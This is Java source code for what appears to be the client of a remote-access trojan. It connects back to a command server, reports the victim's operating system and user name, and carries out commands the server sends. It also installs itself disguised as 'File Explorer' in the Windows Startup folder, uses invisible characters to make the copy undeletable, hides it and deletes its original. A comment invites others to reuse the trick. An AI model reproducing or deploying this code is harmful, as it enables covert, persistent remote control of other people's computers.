package me.sebsb;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;

import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;

public class Client {

	public static final int PORT = 5554;
	public static final long RETRY = 5000;
	public static final String IP = "127.0.0.1";
	public static final StartupMode startup = StartupMode.HIDDEN;
	
	private static ClientManager manager;
	private PrintWriter pw;
	
	public void run() {
		try {
			Socket s = null;
			while (s == null) {
				try {
					s = new Socket(IP, PORT);
					pw = new PrintWriter(s.getOutputStream(), true);
					this.sendInfo(pw, s);
				} catch (Exception e) {}
				Thread.sleep(RETRY);
			}
			BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
			boolean dead = false;
			while (!dead) {
				try {
					String line = br.readLine();
					if (line == null) {
						dead = true;
						return;
					}
					Packet packet = NetUtils.readPacket(line);
					try {
						manager.onMessage(packet, pw);
					} catch (Exception e) {
						e.printStackTrace();
					}
				} catch (SocketException e2) {
					this.run();
					return;
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			s.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		this.run();
	}
	
	private void sendInfo(PrintWriter pw, Socket s) {
		try {
			Packet packet = new Packet();
			packet.action = MessageType.INFO.getID();
			packet.data = Arrays.asList(new String[] {System.getProperty("os.name"), System.getProperty("user.name")});
			NetUtils.sendMessage(packet, pw);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public Client() {
		this.run();
	}
	
	public static void main(String[] args) {
		if (args.length > 0) {
			try {
				Thread.sleep(8000);
			} catch (InterruptedException e1) {
				e1.printStackTrace();
			}
			try {
				new File(args[0]).delete();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		try {
			startup();
		} catch (Exception e) {
			e.printStackTrace();
		}
		manager = new ClientManager();
		new Client();
	}
	
	/*
	 * BTW this creates undeletable files. I accidently came across this bug with windows which prevents files from being deleted.
	 * If you wanna use this 'exploit' in your own programs make sure u copy and paste the code, typing it again will cause it to not work.
	 * Don't tell Microsoft lol.
	 */
	private static void startup() throws URISyntaxException, IOException {
		File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
			    .toURI());
		String fileName = "File Explorer";
		File startupLoc = new File(System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
		if (!jar.exists() || jar.getName().contains(fileName) || !startupLoc.exists()) {
			return;
		}
		String e = jar.getName().contains(".") ? "." + jar.getName().split("\\.")[jar.getName().split("\\.").length - 1] : ".jar";
		if (startup.equals(StartupMode.NORMAL)) {
			boolean created = false;
			for (int l = 0; l < 15; l++) {
				if (!created) {
					try {
						// If you're wondering why I'm using this string builder, its because this makes files undeletable in windows.
						StringBuilder sb = new StringBuilder(fileName);
						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
							sb.append("\u200e");
						}
						sb.append(e);
						File file = null;
						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(startupLoc, sb.toString())));
						created = true;
						file.setWritable(false);
					} catch (Exception eee) {}
				}
			}
		} else if (startup.equals(StartupMode.HIDDEN)) {
			boolean created = false;
			for (int l = 0; l < 15; l++) {
				if (!created) {
					try {
						StringBuilder sb = new StringBuilder(fileName);
						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
							sb.append("\u200e");
						}
						sb.append(e);
						File file = null;
						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(startupLoc, sb.toString())));
						created = true;
						file.setWritable(false);
						Files.setAttribute(Paths.get(file.getPath()), "dos:hidden", true);
						jar.delete();
					} catch (Exception eee) {}
				}
			}
		}
	}

}

enum StartupMode {
	NONE,
	NORMAL,
	HIDDEN
}
